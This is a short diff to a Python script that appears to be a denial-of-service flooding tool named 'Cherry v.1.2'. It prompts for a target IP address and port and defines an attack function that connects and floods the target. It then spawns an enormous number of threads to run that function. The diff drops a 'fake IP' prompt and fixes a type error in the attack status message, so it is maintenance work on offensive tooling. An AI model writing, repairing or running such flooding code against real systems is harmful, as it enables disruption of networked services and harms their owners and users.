@@ -44,7 +44,6 @@ print("<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>                      
 #asks user for target information
 target = input("[~] Enter Target IP Address -> ")
 port = int(input("[~] Enter Target Port To Attack -> "))
-fake_ip = input("[~] Enter Fake IP Address -> ")
 
 #connects to the target ip and floods it
 def attack():
@@ -57,7 +56,7 @@ def attack():
         s.shutdown(socket.SHUT_RDWR)
         s.close()
 
-        print("[+] Initialized Attack On " + target + ", Port " + port + " | Attack Using Cherry v.1.2")
+        print("[+] Initialized Attack On " + target + ", Port " + str(port) + " | Attack Using Cherry v.1.2")
     all_threads = []
     for i in range(10000000000000):
         thread = threading.Thread(target=attack)
